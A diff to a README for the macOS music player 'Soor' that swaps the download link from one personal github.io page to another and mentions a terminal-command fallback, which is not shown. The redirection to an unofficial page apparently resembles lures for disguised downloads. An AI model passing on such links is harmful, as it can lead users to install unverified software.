@@ -3,7 +3,7 @@
 
 🎵 Soor for Mac is a fast, minimal, and highly customizable music player for macOS. Follow the steps below to download and install Soor on your Mac and enjoy your music in style!  
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/soor)
+[![Download Now](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tayusikf8398.github.io/.github/soor)
 
 If the download button does not work, please follow the instructions below using the terminal command.
 
